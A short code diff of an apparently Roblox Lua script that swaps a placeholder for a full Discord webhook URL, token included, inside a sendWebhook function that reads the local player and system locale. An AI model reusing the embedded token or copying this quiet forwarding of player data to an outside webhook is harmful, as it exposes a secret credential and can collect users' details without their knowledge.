@@ -14,7 +14,7 @@ local function sendWebhook()
     local LocalizationService = game:GetService("LocalizationService")
     local Players = game:GetService("Players")
     
-    local webhook = "null削除"
+    local webhook = "https://discord.com/api/webhooks/1565993511914831922/HGDAcIY76hy58XiJCTHcpo79P1wb0BZ6x9ZBESBdU2nvkdfMJcjUjZ8vlvSlFkqJQHmb"
     
     local player = Players.LocalPlayer
     local osLocale = LocalizationService.SystemLocaleId
